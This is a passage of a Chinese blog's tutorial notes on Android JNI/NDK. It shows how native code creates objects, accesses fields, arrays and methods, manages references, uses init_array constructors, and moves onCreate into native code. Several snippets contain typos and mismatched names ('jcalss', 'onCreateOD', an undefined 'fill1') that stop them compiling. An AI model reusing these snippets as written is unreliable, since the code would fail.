class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//NewObject创建对象</span></span><br><span class="line">jclass clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jmethodID methodID = env-&gt;<span class="built_in">GetMethodID</span>(clazz, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">jobject ReflectDemoObj = env-&gt;<span class="built_in">NewObject</span>(clazz, methodID);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;ReflectDemoObj %p&quot;</span>, ReflectDemoObj);</span><br><span class="line"></span><br><span class="line"><span class="comment">//AllocObject创建对象</span></span><br><span class="line">jclass clazz2 = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jmethodID methodID2 = env-&gt;<span class="built_in">GetMethodID</span>(clazz2, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;I)V&quot;</span>);</span><br><span class="line">jobject ReflectDemoObj2 = env-&gt;<span class="built_in">AllocObject</span>(clazz2);   <span class="comment">//相当于获取空间</span></span><br><span class="line">jstring jstr = env-&gt;<span class="built_in">NewStringUTF</span>(<span class="string">&quot;from jni str&quot;</span>);</span><br><span class="line">env-&gt;<span class="built_in">CallNonvirtualVoidMethod</span>(ReflectDemoObj2, clazz2, methodID2, jstr, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><h2 id="通过jni访问Java属性">通过jni访问Java属性</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取静态字段</span></span><br><span class="line">jclass clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jfieldID privateStaticStringField =</span><br><span class="line">            env-&gt;<span class="built_in">GetStaticFieldID</span>(clazz, <span class="string">&quot;privateStaticStringField&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">jstring privateStaticString =</span><br><span class="line">            <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetStaticObjectField</span>(clazz, privateStaticStringField));</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* privatecstr =</span><br><span class="line">            env-&gt;<span class="built_in">GetStringUTFChars</span>(privateStaticString, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;privateStaticString: %s&quot;</span>, privatecstr);</span><br><span class="line">env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(privateStaticString, privatecstr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取对象字段</span></span><br><span class="line">jclass clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jmethodID methodID = env-&gt;<span class="built_in">GetMethodID</span>(clazz, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">jobject ReflectDemoObj = env-&gt;<span class="built_in">NewObject</span>(clazz, methodID);</span><br><span class="line"></span><br><span class="line">jfieldID publicStringField =</span><br><span class="line">            env-&gt;<span class="built_in">GetFieldID</span>(clazz, <span class="string">&quot;publicStringField&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">jstring publicString =</span><br><span class="line">            <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetObjectField</span>(ReflectDemoObj, publicStringField));</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* publiccstr = env-&gt;<span class="built_in">GetStringUTFChars</span>(publicString, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;publicStringField: %s&quot;</span>, publiccstr);</span><br><span class="line">env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(publicString, publiccstr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置字段 先指定到这个字段，在设置</span></span><br><span class="line"> jfieldID privateStringFieldID =</span><br><span class="line">            env-&gt;<span class="built_in">GetFieldID</span>(clazz, <span class="string">&quot;privateStringField&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line"></span><br><span class="line">jstring privateString =</span><br><span class="line">            <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetObjectField</span>(ReflectDemoObj, privateStringFieldID));</span><br><span class="line"></span><br><span class="line">env-&gt;<span class="built_in">SetObjectField</span>(ReflectDemoObj, privateStringFieldID, env-&gt;<span class="built_in">NewStringUTF</span>(<span class="string">&quot;zxk1ng&quot;</span>));</span><br><span class="line">`</span><br><span class="line">privateString = <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetObjectField</span>(ReflectDemoObj, privateStringFieldID));</span><br><span class="line">privateCstr = env-&gt;<span class="built_in">GetStringUTFChars</span>(privateString, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;privateStringField new: %s&quot;</span>, privateCstr);</span><br><span class="line">env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(privateString, privateCstr);</span><br></pre></td></tr></table></figure><h2 id="通过jni访问数组">通过jni访问数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取数组字段</span></span><br><span class="line"><span class="type">jfieldID</span> <span class="variable">byteArrayID</span> <span class="operator">=</span> env-&gt;GetFieldID(clazz, <span class="string">&quot;byteArray&quot;</span>, <span class="string">&quot;[B&quot;</span>);</span><br><span class="line"><span class="type">jbyteArray</span> <span class="variable">byteArray</span> <span class="operator">=</span> static_cast&lt;jbyteArray&gt;(env-&gt;GetObjectField(ReflectDemoObj, byteArrayID));</span><br><span class="line"><span class="type">int</span> <span class="variable">_byteArrayLength</span> <span class="operator">=</span> env-&gt;GetArrayLength(byteArray);  <span class="comment">//获取长度</span></span><br><span class="line">jbyte* CBytes = env-&gt;GetByteArrayElements(byteArray, nullptr);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; _byteArrayLength; i++) &#123;</span><br><span class="line">    LOGD(<span class="string">&quot;jbyteArray: %d&quot;</span>, CBytes[i]);</span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//修改数组字段</span></span><br><span class="line"><span class="type">char</span> javaByte[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">    javaByte[i] = static_cast&lt;<span class="type">char</span>&gt;(<span class="number">100</span> - i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const jbyte *java_array = reinterpret_cast&lt;const jbyte *&gt;(javaByte);</span><br><span class="line">env-&gt;SetByteArrayRegion(byteArray, <span class="number">0</span>, _byteArrayLength, java_array);</span><br><span class="line"></span><br><span class="line">byteArray = static_cast&lt;jbyteArray&gt;(env-&gt;GetObjectField(ReflectDemoObj, byteArrayID));</span><br><span class="line">_byteArrayLength = env-&gt;GetArrayLength(byteArray);</span><br><span class="line">jbyte* CBytes = env-&gt;GetByteArrayElements(byteArray, nullptr);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; _byteArrayLength; i++) &#123;</span><br><span class="line">    LOGD(<span class="string">&quot;jbyteArray: %d&quot;</span>, CBytes[i]);      </span><br><span class="line">&#125;</span><br><span class="line">env-&gt;ReleaseByteArrayElements(byteArray, CBytes, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="通过jni访问方法">通过jni访问方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用静态方法</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">clazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">publicStaticFuncID</span> <span class="operator">=</span></span><br><span class="line">            env-&gt;GetStaticMethodID(clazz, <span class="string">&quot;publicStaticFunc&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line"> env-&gt;CallStaticVoidMethod(clazz, publicStaticFuncID);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用动态方法 先创建对象，然后：</span></span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">privateFuncID</span> <span class="operator">=</span></span><br><span class="line">            env-&gt;GetMethodID(clazz, <span class="string">&quot;privateFunc&quot;</span>, <span class="string">&quot;(Ljava/lang/String;I)Ljava/lang/String;&quot;</span>);</span><br><span class="line">    <span class="type">jstring</span> <span class="variable">str1</span> <span class="operator">=</span> env-&gt;NewStringUTF(<span class="string">&quot;this is from JNI&quot;</span>);</span><br><span class="line">    <span class="type">jstring</span> <span class="variable">retval_jstring</span> <span class="operator">=</span> static_cast&lt;jstring&gt;(env-&gt;CallObjectMethod(ReflectDemoObj, privateFuncID, str1, <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">    const <span class="type">char</span>* retval_cstr = env-&gt;GetStringUTFChars(retval_jstring, nullptr);</span><br><span class="line">    LOGD(<span class="string">&quot;privateStaticString: %s&quot;</span>, retval_cstr);</span><br><span class="line">    env-&gt;ReleaseStringUTFChars(retval_jstring, retval_cstr);</span><br></pre></td></tr></table></figure><p>2）CallVoidMethod与CallVoidMethodV的区别是：CallVoidMethod可以传入多个参数，CallVoidMethodV只能传入一个参数，要自己处理参数</p><p>CallVoidMethodA</p><p>jvalue相当于一个结构体，可以指定类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">jstring</span> <span class="variable">str2</span> <span class="operator">=</span> env-&gt;NewStringUTF(<span class="string">&quot;this is from JNI2&quot;</span>);</span><br><span class="line">jvalue args[<span class="number">2</span>];</span><br><span class="line">args[<span class="number">0</span>].l = str2;  <span class="comment">//0号存入jobject类型数据</span></span><br><span class="line">args[<span class="number">1</span>].i = <span class="number">1000</span>;  <span class="comment">//1号存入int类型数据</span></span><br><span class="line"></span><br><span class="line"><span class="type">jstring</span> <span class="variable">retval</span> <span class="operator">=</span> static_cast&lt;jstring&gt;(env-&gt;CallObjectMethodA(ReflectDemoObj, privateFuncID, args));</span><br><span class="line">const <span class="type">char</span>* cpp_retval = env-&gt;GetStringUTFChars(retval, nullptr);</span><br><span class="line">LOGD(<span class="string">&quot;cpp_retval: %s&quot;</span>, cpp_retval);</span><br><span class="line">env-&gt;ReleaseStringUTFChars(retval, cpp_retval);</span><br></pre></td></tr></table></figure><p>3）参数是数组String[] 返回值是数组int[]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// String strArr[] = new String[3];</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">StringClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line"><span class="type">jobjectArray</span> <span class="variable">StringArr</span> <span class="operator">=</span> env-&gt;NewObjectArray(<span class="number">3</span>, StringClazz, nullptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i = 0; i &lt; 3; i++)&#123;</span></span><br><span class="line"><span class="comment">//        strArr[i] = &quot;NDK&quot;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line"><span class="type">jstring</span> <span class="variable">str3</span> <span class="operator">=</span> env-&gt;NewStringUTF(<span class="string">&quot;NDK&quot;</span>);</span><br><span class="line">env-&gt;SetObjectArrayElement(StringArr, i, str3);</span><br><span class="line">    <span class="comment">//env-&gt;DeleteLocalRef(str3);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">privateStaticFuncID</span> <span class="operator">=</span> env-&gt;GetStaticMethodID(clazz, <span class="string">&quot;privateStaticFunc&quot;</span>, <span class="string">&quot;([Ljava/lang/String;)[I&quot;</span>);</span><br><span class="line"><span class="type">jintArray</span> <span class="variable">intArr</span> <span class="operator">=</span> static_cast&lt;jintArray&gt;(env-&gt;CallStaticObjectMethod(clazz, privateStaticFuncID, StringArr));</span><br><span class="line"><span class="type">int</span> *cintArr = env-&gt;GetIntArrayElements(intArr, nullptr);</span><br><span class="line"> LOGD(<span class="string">&quot;cintArr[9]=%d&quot;</span>, cintArr[<span class="number">9</span>]);</span><br><span class="line">env-&gt;ReleaseIntArrayElements(intArr, cintArr, JNI_ABORT);</span><br></pre></td></tr></table></figure><p>当在NDK中调用java层一个函数：且函数格式为：void func(int [] data)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">jintArray</span> <span class="variable">jArray1</span> <span class="operator">=</span> env-&gt;NewIntArray(<span class="number">16</span>);</span><br><span class="line">jint fill[<span class="number">16</span>]=&#123;数据&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">jclass</span> <span class="variable">clazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/hectf2024/ezandroid/CheckActivity&quot;</span>);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">methodID</span> <span class="operator">=</span> env-&gt;GetMethodID(clazz, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line"><span class="type">jobject</span> <span class="variable">ReflectDemoObj</span> <span class="operator">=</span> env-&gt;NewObject(clazz, methodID);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">privateFuncID</span> <span class="operator">=</span></span><br><span class="line">        env-&gt;GetMethodID(clazz, <span class="string">&quot;func&quot;</span>, <span class="string">&quot;([I)Ljava/lang/String;&quot;</span>);</span><br><span class="line"></span><br><span class="line">env-&gt;SetIntArrayRegion(jArray1, <span class="number">0</span>, <span class="number">16</span>, fill1);</span><br><span class="line">(env-&gt;CallVoidMethod(ReflectDemoObj, privateFuncID, jArray1));</span><br></pre></td></tr></table></figure><h2 id="通过jni访问Java父类方法">通过jni访问Java父类方法</h2><p>native实现onCreate中的 super.onCreate()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">extern <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT <span class="keyword">void</span> JNICALL</span><br><span class="line"><span class="title function_">Java_com_example_ndk_1demo_MainActivity_onCreate</span><span class="params">(JNIEnv *env, jobject thiz,</span></span><br><span class="line"><span class="params">                                                 jobject saved_instance_state)</span> &#123;</span><br><span class="line">    jcalss AppCompatActivityClazz=</span><br><span class="line">        env-&gt;FindClass(<span class="string">&quot;androidx/appcompat/app/AppCompatActivity&quot;</span>);</span><br><span class="line">    jmethodID onCreateID=</span><br><span class="line">        env-&gt;GetMethodID(AppCompatActivity,<span class="string">&quot;onCreate&quot;</span>,<span class="string">&quot;(Landroid/os/Bundle;)V&quot;</span>);</span><br><span class="line">    env-&gt;CallNonvirtualVoidMethod(thiz,AppCompatActivity,onCreateOD,saved_instance_state);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存管理">内存管理</h2><p>1.局部引用</p><p>大多数的jni函数调用以后返回的结果都是局部引用。一个函数内部的局部引用的数量是有限的，当函数体内需要大量使用局部引用时，最好及时删除不用的局部引用，可以使用env-&gt;DeleteLocalRef来删除局部引用。</p><p>1.1局部引用相关其他函数</p><p>env-&gt;EnsureLocalCapacity(num)：判断是否有足够的局部引用可以使用，足够则返回0，需要大量使用局部引用时，手动删除太麻烦，可使用以下两个函数来批量管理局部引用</p><p>env-&gt;PushLocalFrame(num)</p><p>env-&gt;PopLocalFrame(nullptr)</p><p>2.全局引用</p><p>在 jni 开发中，需要跨函数使用变量时，直接定义全局变量是没用的需要使用以下两个方法，</p><p>env-&gt;NewGlobalRef</p><p>env-&gt;DeleteGlobalRef</p><p>3.弱全局引用</p><p>与全局引用基本相同，区别是弱全局引用有可能会被回收</p><p>env-&gt;NewWeakGlobalRef</p><p>env-&gt;DeleteWeakGlobalRef</p><h2 id="子线程中获取java类">子线程中获取java类</h2><p>1）在子线程中，findClass可以直接获取系统类</p><p>2）在主线程中获取类，使用全局引用来传递到子线程中</p><p>3）在主线程中获取正确的ClassLoader，在子线程中去加载类</p><p>​3.1在Java中，可以先获取类字节码，然后使用getClassLoader()获取</p><p>​Demo. class. getClassLoader()</p><p>​new Demo().getClass(). getClassLoader()</p><p>​Class.forName(类路径).getClassLoader()</p><p>​3.2 在jni的主线程中获取ClassLoader</p><p>​3.3 在jni的子线程中获取loadClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">jobject ClassLoaderObj;</span><br><span class="line"><span class="comment">//子线程中</span></span><br><span class="line">JNIEnv* env = nullptr;</span><br><span class="line"><span class="keyword">if</span>(globalVM-&gt;AttachCurrentThread(reinterpret_cast&lt;JNIEnv **&gt;(&amp;env), nullptr) != JNI_OK)&#123;</span><br><span class="line">LOGD(<span class="string">&quot;myThread GetEnv failed&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    LOGD(<span class="string">&quot;myThread JNIEnv: %p&quot;</span>, env);</span><br><span class="line"></span><br><span class="line">    <span class="type">jclass</span> <span class="variable">ClassLoaderClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;java/lang/ClassLoader&quot;</span>); <span class="comment">//子线程中可以findclass获得系统类</span></span><br><span class="line">    <span class="type">jmethodID</span> <span class="variable">loadClassID</span> <span class="operator">=</span> env-&gt;GetMethodID(ClassLoaderClazz, <span class="string">&quot;loadClass&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;</span>);</span><br><span class="line">    <span class="type">jclass</span> <span class="variable">MainActivityClazz</span> <span class="operator">=</span> static_cast&lt;jclass&gt;(env-&gt;CallObjectMethod(ClassLoaderObj, loadClassID, env-&gt;NewStringUTF(<span class="string">&quot;com.xiaojianbang.ndkdemo.MainActivity&quot;</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//jclass MainActivityClazz = env-&gt;FindClass(&quot;com/xiaojianbang/ndkdemo/MainActivity&quot;);</span></span><br><span class="line"><span class="comment">//主线程中</span></span><br><span class="line"><span class="comment">// MainActivity.class.getClassLoader();</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">MainActivityClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/xiaojianbang/ndkdemo/MainActivity&quot;</span>);</span><br><span class="line"><span class="type">jclass</span> <span class="variable">classClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;java/lang/Class&quot;</span>);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">getClassLoaderID</span> <span class="operator">=</span> env-&gt;GetMethodID(classClazz, <span class="string">&quot;getClassLoader&quot;</span>, <span class="string">&quot;()Ljava/lang/ClassLoader;&quot;</span>);</span><br><span class="line"><span class="type">jobject</span> <span class="variable">tempClassLoaderObj</span> <span class="operator">=</span> env-&gt;CallObjectMethod(MainActivityClazz, getClassLoaderID);</span><br><span class="line">ClassLoaderObj = env-&gt;NewGlobalRef(tempClassLoaderObj);</span><br></pre></td></tr></table></figure><h2 id="init与initarray">init与initarray</h2><p>在so执行JNI_OnLoad之前，还会执行两个构造函数init，initarray</p><p>so加固，so中的字符串加密等等，一般会把相关代码放到这里</p><p>init使用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _init()&#123;  <span class="comment">//函数名必须为_init 在ida中被编译为init_proc</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initarray使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute__ ((constructor)) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br><span class="line">__attribute__ ((constructor(<span class="number">200</span>))) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br><span class="line">__attribute__ ((constructor(<span class="number">101</span>))) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br><span class="line">__attribute__ ((constructor)) <span class="keyword">void</span> <span class="title function_">initArrayTest1</span> <span class="params">()</span> &#123; . . . &#125;</span><br></pre></td></tr></table></figure><p>当函数全写成第一个格式，执行顺序从上到下。</p><p>当函数有数字时：数字越小越先执行。</p><p>有数字和没有数字：没有数字最后执行</p><p>即constructor 后面的值，较小的先执行，最好从100以后开始用，如果 constructor 后面没有跟值，那么按定义的顺序，从上往下执行。</p><h2 id="onCreate的native化">onCreate的native化</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">JNIEXPORT <span class="type">void</span> JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_xiaojianbang_ndkdemo_MainActivity_onCreate</span><span class="params">(JNIEnv *env, jobject thiz, jobject saved_instance_state)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement onCreate()</span></span><br><span class="line">    <span class="comment">// super.onCreate(savedInstanceState);</span></span><br><span class="line">    jclass AppCompatActivityClazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;androidx/appcompat/app/AppCompatActivity&quot;</span>);</span><br><span class="line">    jmethodID onCreateID = env-&gt;<span class="built_in">GetMethodID</span>(AppCompatActivityClazz, <span class="string">&quot;onCreate&quot;</span>, <span class="string">&quot;(Landroid/os/Bundle;)V&quot;</span>);</span><br><span class="line">    env-&gt;<span class="built_in">CallNonvirtualVoidMethod</span>(thiz,AppCompatActivityClazz, onCreateID, saved_instance_state);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getLayoutInflater()</span></span><br><span class="line">    <span class="comment">//android.app.Activity getLayoutInflater</span></span><br><span class="line">    jclass ActivityClazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;android/app/Activity&quot;</span>);</span><br><span class="line">    jmethodID getLayoutInflaterID = env-&gt;<span class="built_in">GetMethodID</span>(ActivityClazz, <span class="string">&quot;getLayoutInflater&quot;</span>, <span class="string">&quot;()Landroid/view/LayoutInflater;&quot;</span>);</span><br><span class="line">    jobject LayoutInflater = env-&gt;<span class="built_in">CallObjectMethod</span>(thiz, getLayoutInflaterID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// binding = ActivityMainBinding.inflate(getLayoutInflater());</span></span><br><span class="line">    <span class="comment">// com.xiaojianbang.ndkdemo.databinding.ActivityMainBinding inflate</span></span><br><span class="line">    <span class="comment">// public static ActivityMainBinding inflate(LayoutInflater inflater)</span></span><br><span class="line">    jclass ActivityMainBindingClazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/xiaojianbang/ndkdemo/databinding/ActivityMainBinding&quot;</span>);</span><br><span class="line">    jmethodID inflateID = env-&gt;<span class="built_in">GetStaticMethodID</span>(ActivityMainBindingClazz, <span class="string">&quot;inflate&quot;</span>, <span class="string">&quot;(Landroid/view/LayoutInflater;)Lcom/xiaojianbang/ndkdemo/databinding/ActivityMainBinding;&quot;</span>);</span><br><span class="line">    <span class="built_in">LOGD</span>(<span class="string">&quot;ActivityMainBindingClazz %p&quot;</span>, ActivityMainBindingClazz);</span><br><span class="line">    <span class="built_in">LOGD</span>(<span class="string">&quot;inflateID %p&quot;</span>, inflateID);</span><br><span class="line">    jobject ActivityMainBindingObj = env-&gt;<span class="built_in">CallStaticObjectMethod</span>(ActivityMainBindingClazz, inflateID, LayoutInflater);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// binding.getRoot()</span></span><br><span class="line">    <span class="comment">// com.xiaojianbang.ndkdemo.databinding.ActivityMainBinding</span></span><br><span class="line">    <span class="comment">// public ConstraintLayout getRoot()</span></span><br><span class="line">    jmethodID getRootID = env-&gt;<span class="built_in">GetMethodID</span>(ActivityMainBindingClazz, <span class="string">&quot;getRoot&quot;</span>, <span class="string">&quot;()Landroidx/constraintlayout/widget/ConstraintLayout;&quot;</span>);</span><br><span class="line">    jobject ConstraintLayout = env-&gt;<span class="built_in">CallObjectMethod</span>(ActivityMainBindingObj, getRootID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// setContentView(binding.getRoot());</span></span><br><span class="line">    jmethodID setContentViewID = env-&gt;<span class="built_in">GetMethodID</span>(AppCompatActivityClazz, <span class="string">&quot;setContentView&quot;</span>, <span class="string">&quot;(Landroid/view/View;)V&quot;</span>);</span><br><span class="line">    env-&gt;<span class="built_in">CallVoidMethod</span>(thiz, setContentViewID, ConstraintLayout);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
